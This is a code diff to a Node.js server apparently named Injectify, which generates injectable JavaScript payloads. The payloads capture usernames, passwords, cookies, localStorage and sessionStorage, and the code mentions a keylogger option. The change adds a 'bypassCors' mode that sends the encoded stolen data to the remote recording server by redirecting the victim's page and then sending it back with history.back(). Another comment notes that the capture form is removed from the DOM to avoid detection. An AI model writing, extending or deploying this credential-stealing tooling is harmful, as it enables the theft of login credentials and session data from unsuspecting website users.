@@ -703,18 +703,26 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				}
 			})
 		}
-		// Send a 1x1px gif
-		let data = [
-			0x47,0x49, 0x46,0x38, 0x39,0x61, 0x01,0x00, 0x01,0x00, 0x80,0x00, 0x00,0xFF, 0xFF,0xFF,
-			0x00,0x00, 0x00,0x21, 0xf9,0x04, 0x04,0x00, 0x00,0x00, 0x00,0x2c, 0x00,0x00, 0x00,0x00,
-			0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
-		]
-		res.set('Content-Type', 'image/gif')
-		   .set('Content-Length', data.length)
-		   .status(200)
-		   .send(new Buffer(data))
-
-		validate(req.path.substring(1).split(/\/(.+)?/, 2)[1]).then(record => {
+		let path
+		if(req.path.slice(-1) == "$") {
+			path = req.path.slice(-1).substring(1).split(/\/(.+)?/, 2)[1]
+			res.set('Content-Type', 'text/html')
+			   .send("<script>window.history.back()</script>")
+		} else {
+			path = req.path.substring(1).split(/\/(.+)?/, 2)[1]
+			// Send a 1x1px gif
+			let data = [
+				0x47,0x49, 0x46,0x38, 0x39,0x61, 0x01,0x00, 0x01,0x00, 0x80,0x00, 0x00,0xFF, 0xFF,0xFF,
+				0x00,0x00, 0x00,0x21, 0xf9,0x04, 0x04,0x00, 0x00,0x00, 0x00,0x2c, 0x00,0x00, 0x00,0x00,
+				0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
+			]
+			res.set('Content-Type', 'image/gif')
+			   .set('Content-Length', data.length)
+			   .status(200)
+			   .send(new Buffer(data))
+		}
+		   
+		validate(path).then(record => {
 			Record(record).then(message => {
 				if (config.debug) console.log(
 					chalk.greenBright("[record] ") + 
@@ -871,6 +879,13 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				return ''
 			}
 		}
+		function sendToServer(url) {
+			if (bypassCors) {
+				return 'window.location=' + url + '+"$"'
+			} else {
+				return enc('c.src=' + url, true)
+			}
+		}
 		let valid = true
 		if (!req.query.project) valid = false
 
@@ -886,6 +901,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		if (req.query.sessionStorage == "false") sessionStorage = false
 		let cookies			= true
 		if (req.query.cookies == "false") cookies = false
+		let bypassCors			= false
+		if (req.query.bypassCors == "true") bypassCors = true
 		
 		let proxy			= "//injectify.samdd.me/record/"
 		if (config.dev) proxy = "http://localhost:" + config.express + "/record/"
@@ -932,7 +949,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 							b: g,
 							c: f
 						}
-						c.src=p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')
+						` + sendToServer("p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')") + `
 						f = []
 					}, 3000)
 				`
@@ -941,10 +958,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				variables	+= 'j = k.screen, a = k.devicePixelRatio,'
 				json		+= 'e: j.height * a, f: j.width * a,'
 			}
-			if (location)	json += 'd: k.location.href,'
-			if (localStorage)	catcher += 'i.g = localStorage,'
-			if (sessionStorage)	catcher += 'i.h = sessionStorage,'
-			if (cookies)		json += 'i: d.cookie,'
+			if (location)		json		+= 'd: k.location.href,'
+			if (localStorage)	catcher		+= 'i.g = localStorage,'
+			if (sessionStorage)	catcher		+= 'i.h = sessionStorage,'
+			if (cookies)		json		+= 'i: d.cookie,'
 
 			if (variables)	variables 	= ',' + variables.slice(0, -1)
 			if (json) 		json 		= ',' + json.slice(0, -1)
@@ -970,6 +987,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				// │ minify         │ BOOLEAN │ FALSE    │
 				// │ comments       │ BOOLEAN │ FALSE    │
 				// | debug          | BOOLEAN | FALSE    |
+				// | bypassCors     | BOOLEAN | FALSE    |
 				// │                │         │          │
 				// | keylogger      │ BOOLEAN │ FALSE    |
 				// │ screenSize     │ BOOLEAN │ TRUE     │
@@ -1008,7 +1026,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					}` + catcher +  `
 					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
 						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") +
-						enc(`c.src=p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`, true) + 
+						sendToServer(`p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`) + 
 						comment("remove the form node from the DOM (so it can't be (easily) seen in devtools)") + `
 					w.remove()
 				})
@@ -1049,6 +1067,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			// │ minify         │ BOOLEAN │ FALSE    │
 			// │ comments       │ BOOLEAN │ FALSE    │
 			// | debug          | BOOLEAN | FALSE    |
+			// | bypassCors     | BOOLEAN | FALSE    |
 			// │                │         │          │
 			// | keylogger      │ BOOLEAN │ FALSE    |
 			// │ screenSize     │ BOOLEAN │ TRUE     │
